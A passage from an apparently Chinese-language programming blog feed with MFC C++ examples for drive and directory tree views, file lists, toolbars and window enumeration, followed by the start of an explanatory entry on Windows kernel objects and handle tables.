class="line">CListCtrl m_objList;</span><br><span class="line">HTREEITEM hOldTree;&#x2F;&#x2F;记录最后一次的树节点</span><br><span class="line">CMyFilePopDlg m_objFilePopDlg;</span><br><span class="line">public:</span><br><span class="line">afx_msg void OnDblclkList1(NMHDR* pNMHDR, LRESULT* pResult);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMyTreeDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD dwStyle = GetWindowLong(m_objTree.m_hWnd, GWL_STYLE);</span><br><span class="line">dwStyle |= TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT;</span><br><span class="line">SetWindowLong(m_objTree.m_hWnd, GWL_STYLE, dwStyle);</span><br><span class="line"><span class="comment">////HICON hIcon = theApp.LoadIcon(IDB_BITMAP1);        //图标句柄</span></span><br><span class="line">                        <span class="comment">//图标添加到图像序列</span></span><br><span class="line">GetDistHeadInfo();</span><br><span class="line"></span><br><span class="line">m_Root = m_objTree.InsertItem(<span class="string">L&quot;我的电脑&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Disk.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line">HTREEITEM hDiskHead = m_objTree.InsertItem(Disk[i]-&gt;csDiskHead, m_Root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HICON hIcon = LoadIcon(AfxGetApp()-&gt;m_hInstance, MAKEINTRESOURCE(IDR_MAINFRAME));//加载本地自己的图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//m_ImageList.Add(hIcon);</span></span><br><span class="line"><span class="comment">//初始化列表框LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES</span></span><br><span class="line">m_objList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES);<span class="comment">//更改风格</span></span><br><span class="line">m_objList.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;文件名&quot;</span>, <span class="number">0</span>, <span class="number">300</span>);</span><br><span class="line">m_objList.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;文件大小&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objList.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;文件大小&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objList.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;文件大小&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历盘符</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTreeDlg::GetDistHeadInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"></span><br><span class="line">DWORD 总容量;</span><br><span class="line">DWORD 空闲容量;</span><br><span class="line">GetLogicalDriveStrings(<span class="number">100</span>, buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> Flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">MyDiskHeadInfo* pds = <span class="keyword">new</span> MyDiskHeadInfo;</span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = GetDriveType(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="comment">//..ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;可移动设备&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;可移动设备&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="comment">//ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;硬盘&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;硬盘&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="comment">//ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;远程设备&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;远程设备&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="comment">//ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;光驱&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;光驱&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line">GetDiskFreeSpace(pTemp,</span><br><span class="line">&amp;每簇的扇区数量,</span><br><span class="line">&amp;每个扇区的容量,</span><br><span class="line">&amp;空闲簇的总量,</span><br><span class="line">&amp;全部簇的总量</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">pds-&gt;uAllSize = (((全部簇的总量 / <span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>;</span><br><span class="line">pds-&gt;uAbouleSize = (((空闲簇的总量 / <span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>;</span><br><span class="line">pds-&gt;uUsed = pds-&gt;uAllSize - pds-&gt;uAbouleSize;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pds-&gt;csDiskHead = pTemp;</span><br><span class="line">Disk.push_back(pds);</span><br><span class="line">pTemp += wcslen(buf) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">Flag++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数功能:获取树项目全根路径</span></span><br><span class="line"><span class="function">CString <span class="title">CMyTreeDlg::GetFullPath</span><span class="params">(HTREEITEM hCurrent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString strTemp;</span><br><span class="line">CString strReturn = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (hCurrent != m_Root)</span><br><span class="line">&#123;</span><br><span class="line">strTemp = m_objTree.GetItemText(hCurrent);    <span class="comment">//检索列表中项目文字</span></span><br><span class="line"><span class="keyword">if</span> (strTemp.Right(<span class="number">1</span>) != <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">strTemp += <span class="string">&quot;\\&quot;</span>;</span><br><span class="line">strReturn = strTemp + strReturn;</span><br><span class="line">hCurrent = m_objTree.GetParentItem(hCurrent); <span class="comment">//返回父项目句柄</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数功能:添加子目录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTreeDlg::AddSubDir</span><span class="params">(HTREEITEM hParent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString strPath = GetFullPath(hParent);     <span class="comment">//获取全路径</span></span><br><span class="line"><span class="keyword">if</span> (strPath.Right(<span class="number">1</span>) != <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">strPath += <span class="string">&quot;\\&quot;</span>;</span><br><span class="line">strPath += <span class="string">&quot;*.*&quot;</span>;</span><br><span class="line">CFileFind file;</span><br><span class="line">BOOL bContinue = file.FindFile(strPath);    <span class="comment">//查找包含字符串的文件</span></span><br><span class="line"><span class="keyword">while</span> (bContinue)</span><br><span class="line">&#123;</span><br><span class="line">bContinue = file.FindNextFile();        <span class="comment">//查找下一个文件</span></span><br><span class="line"><span class="keyword">if</span> (file.IsDirectory() &amp;&amp; !file.IsDots())</span><br><span class="line">m_objTree.InsertItem(file.GetFileName(), hParent);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//双击树控件节点响应</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTreeDlg::OnDblclkTree1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LPNMTREEVIEW pNMTreeView = reinterpret_cast&lt;LPNMTREEVIEW&gt;(pNMHDR);</span></span><br><span class="line"><span class="comment">//LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span></span><br><span class="line">CPoint point;</span><br><span class="line">GetCursorPos(&amp;point);  <span class="comment">//获取鼠标点击的坐标</span></span><br><span class="line">m_objTree.ScreenToClient(&amp;point);  <span class="comment">//屏幕坐标转为客户区坐标</span></span><br><span class="line">UINT uFlags = <span class="number">0</span>;</span><br><span class="line">HTREEITEM hCurItem;</span><br><span class="line">hCurItem = m_objTree.HitTest(point, &amp;uFlags);<span class="comment">//获得当前点击节点的ITEM</span></span><br><span class="line">hOldTree = hCurItem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hCurItem == m_Root)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">AddSubDir(hCurItem);</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件并插入到列表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTreeDlg::OnSelchangedTree1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//LPNMTREEVIEW pNMTreeView = reinterpret_cast&lt;LPNMTREEVIEW&gt;(pNMHDR);</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">m_objList.DeleteAllItems();</span><br><span class="line">NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;</span><br><span class="line">TVITEM item = pNMTreeView-&gt;itemNew;</span><br><span class="line"><span class="keyword">if</span> (item.hItem == m_Root)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">CString str = GetFullPath(item.hItem);</span><br><span class="line"><span class="keyword">if</span> (str.Right(<span class="number">1</span>) != <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">str += <span class="string">&quot;\\&quot;</span>;</span><br><span class="line">str += <span class="string">&quot;*.*&quot;</span>;</span><br><span class="line">CFileFind file;</span><br><span class="line">BOOL bContinue = file.FindFile(str);</span><br><span class="line"><span class="keyword">while</span> (bContinue)</span><br><span class="line">&#123;</span><br><span class="line">bContinue = file.FindNextFile();</span><br><span class="line"><span class="keyword">if</span> (!file.IsDirectory() &amp;&amp; !file.IsDots())</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">m_objList.InsertItem(<span class="number">0</span>,file.GetFileName());</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTreeDlg::OnDblclkList1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="keyword">int</span> item = pNMItemActivate-&gt;iItem;  <span class="comment">//LPNMITEMACTIVATF 这个结构体 iItem 有列表框记录的信息</span></span><br><span class="line">CString strFileName = m_objList.GetItemText(item, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strFileName.GetLength())<span class="comment">//在这里直接弹Messagebox不知道为什么只要为空就会卡死，所以为空选择跳过</span></span><br><span class="line">&#123;</span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%s%s&quot;</span>, GetFullPath(hOldTree), strFileName);</span><br><span class="line">MessageBox(cs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//CMyFilePopDlg* d_pm = new CMyFilePopDlg;</span></span><br><span class="line"><span class="comment">//d_pm-&gt;Create(IDD_DIALOG3, this);</span></span><br><span class="line"><span class="comment">//d_pm-&gt;ShowWindow(SW_SHOW);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//WCHAR* pBuf = T2W((LPTSTR)(LPCTSTR)cs);</span></span><br><span class="line"><span class="comment">//m_objFilePopDlg.EnumFileInfo(pBuf);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h3><p>添加资源后创建</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//1. 创建工具栏</span></span><br><span class="line">m_objToolBar.Create(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 载入资源</span></span><br><span class="line">m_objToolBar.LoadToolBar(IDR_TOOLBAR1);</span><br><span class="line"><span class="comment">//3. 显示出来</span></span><br><span class="line">RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br></pre></td></tr></table></figure><p>响应工具栏消息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//消息映射中</span></span><br><span class="line"><span class="comment">//ON_COMMAND_RANGE(ID头值，ID尾值,&amp;响应的回调函数);</span></span><br><span class="line">ON_COMMAND_RANGE(ID_BUTTON32771，ID_BUTTON32774,&amp;CMToolBarDlg::OnRangeCmds);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMToolBarDlg::OnRangeCmds</span><span class="params">(UINT nID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(nID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ID_BUTTON32771:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_BUTTON32772:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_BUTTON32773:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_BUTTON32774:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="窗口的枚举与图标"><a href="#窗口的枚举与图标" class="headerlink" title="窗口的枚举与图标"></a>窗口的枚举与图标</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//枚举窗口</span></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">EnumWindowsProc</span><span class="params">(HWND hWnd ,LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">CMyDlg3* t = (CMyDlg3*)lParam;</span><br><span class="line">TCHAR buff[<span class="number">200</span>];</span><br><span class="line">GetWindowText(hWnd, buff, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//HICON hIcon = (HICON)GetClassLongPtr(hWnd, GCLP_HICON);</span></span><br><span class="line"><span class="keyword">static</span> HICON hIcon = LoadIcon(AfxGetApp()-&gt;m_hInstance, MAKEINTRESOURCE(IDR_MAINFRAME));<span class="comment">//加载本地自己的图标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hIcon != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">t-&gt;m_vecIcon.push_back(hIcon);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWindowVisible(hWnd) == TRUE &amp;&amp; wcslen(buff) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%s&quot;</span>, buff);</span><br><span class="line">t-&gt;m_objWndList.InsertItem(i, cs,i);</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化中OnInitDialog()</span></span><br><span class="line"></span><br><span class="line">EnumWindows(EnumWindowsProc, (LPARAM)<span class="keyword">this</span>);</span><br><span class="line">m_objIma.Create(<span class="number">32</span>, <span class="number">32</span>, ILC_COLOR32, <span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//3 将咱们的图标都加入进去</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m_vecIcon.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line">m_objIma.Add(m_vecIcon[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4 需要将列表框和图标列表关联到一起</span></span><br><span class="line">m_objWndList.SetImageList(&amp;m_objIma, LVSIL_SMALL);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows编程 </tag>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows编程————进程线程</title>
      <link href="2020/12/05/Windows%E7%BC%96%E7%A8%8B%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"/>
      <url>2020/12/05/Windows%E7%BC%96%E7%A8%8B%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h2><h3 id="一、内核对象是什么？"><a href="#一、内核对象是什么？" class="headerlink" title="一、内核对象是什么？"></a>一、内核对象是什么？</h3><ul><li>内核对象本质上是一个结构体，但是这个结构体只能由操作系统内核部分进行访问，并且只能由它进行创建，如果用于想要操作一个内核对象，就必须通过句柄找到内核对象，并且使用相应的API进行访问。</li><li>内核对象的通用操作形式：创建内核对象：CreateXXX，打开一个内核对象 OpenXXX，关闭内核对象<strong>一般</strong>会使用到 CloseHandle()。</li></ul><h3 id="二、内核对象的特性"><a href="#二、内核对象的特性" class="headerlink" title="二、内核对象的特性"></a>二、内核对象的特性</h3><ol><li>全局性：内核对象是跨进程的，可以在不同进程中访问同一个对象，通常使用字符串或ID标识一个对象。</li><li>引用计数：每一个内核对象都有一个引用计数，当创建或者打开一个内核对象的时候，引用计数会+1，当关闭一个内核对象的时候，引用计数会-1，当引用计数为0时，内核对象会被销毁。</li><li>安全性：大多数内核对象在创建的时候，都需要设置一个安全属性，安全属性描述了哪些用户可以以什么样的方式访问内核对象，目前通常使用NULL来填充这个字段。</li><li>句柄表：每一个进程都有一个句柄表，相同的内核对象在不同的进程中，可能句柄值是不一样的，通常句柄值是句柄表的下标左移两位(4的倍数)，句柄表描述了内核对象所在的位置以及访问需要用到的权限。<strong>一个进程退出的时候，会主动将句柄表中的内核对象计数-1</strong> 。</li></ol><ul><li>进程A的句柄表</li></ul><table><thead><tr><th>句柄值</th><th>内核对象的地址</th><th>打开的方式</th></tr></thead><tbody><tr><td>[1] * 4</td><td>文件 0x80001000</td><td>创建了文件 test1.txt</td></tr><tr><td>[2] * 4</td><td>文件0x80002000</td><td>打开了 test2.txt</td></tr></tbody></table><ul><li>进程B的句柄表</li></ul><table><thead><tr><th>句柄值</th><th>内核对象的地址</th><th>打开的方式</th></tr></thead><tbody><tr><td>[1] * 4</td><td>文件 0x80002000</td><td>创建了文件 test2.txt</td></tr><tr><td>[2] * 4</td><td>文件 0x80001000</td><td>打开了 test1.txt</td></tr><tr><td>[3] * 4</td><td>文件 0x80001000</td><td>打开了 test1.txt</td></tr></tbody></table><h3 id="三、-内核对象的跨进程访问"><a href="#三、-内核对象的跨进程访问" class="headerlink" title="三、 内核对象的跨进程访问"></a>三、 内核对象的跨进程访问</h3><ol><li>由父进程继承给子进程</li><li>通过内核对象的ID或字符串名称打开内核对象</li><li>使用 DuplicateHandle() 函数在进程间传递内核对象</li></ol><h3 id="四、-在句柄表中添加内核对象的方式"><a href="#四、-在句柄表中添加内核对象的方式" class="headerlink" title="四、 在句柄表中添加内核对象的方式"></a>四、 在句柄表中添加内核对象的方式</h3><ol><li>创建一个内核对象</li><li>打开一个内核对象</li><li>从父进程继承内核对象(子进程本身并不知道自己继承了父进程的内核对象)</li><li>使用 DuplicateHandle()  拷贝内核对象</li></ol><h2 id="进程和模块"><a href="#进程和模块" class="headerlink" title="进程和模块"></a>进程和模块</h2><h3 id="一、-什么是进程？"><a href="#一、-什么是进程？" class="headerlink" title="一、 